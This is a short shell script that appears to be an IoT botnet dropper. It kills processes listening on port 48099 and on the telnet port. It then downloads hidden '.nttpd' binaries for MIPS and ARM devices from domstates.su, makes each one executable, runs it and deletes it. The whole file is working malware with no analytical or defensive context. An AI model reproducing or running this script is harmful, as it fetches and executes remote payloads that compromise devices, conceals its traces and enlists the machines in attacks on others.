#!/bin/sh

cd /tmp

kill -9 `netstat -lntp | sed -nr "s/tcp.+[0-9\.]+\:48099.+LISTEN//p" | sed -nr "s/[\/][a-z0-9]+//p"`
kill -9 `netstat -lntp | sed -nr "s/tcp.+[0-9\.]+\:23.+LISTEN//p" | sed -nr "s/[\/][a-z0-9]+//p"`

rm -f .nttpd
wget -O .nttpd http://domstates.su/.nttpd,20-mips-le-t1
chmod +x .nttpd
./.nttpd

rm -f .nttpd
wget -O .nttpd http://domstates.su/.nttpd,19-arm-le-t1
chmod +x .nttpd
./.nttpd

rm -f .nttpd
wget -O .nttpd http://domstates.su/.nttpd,18-mips-be-t2
chmod +x .nttpd
./.nttpd

sleep 1
rm -f .nttpd
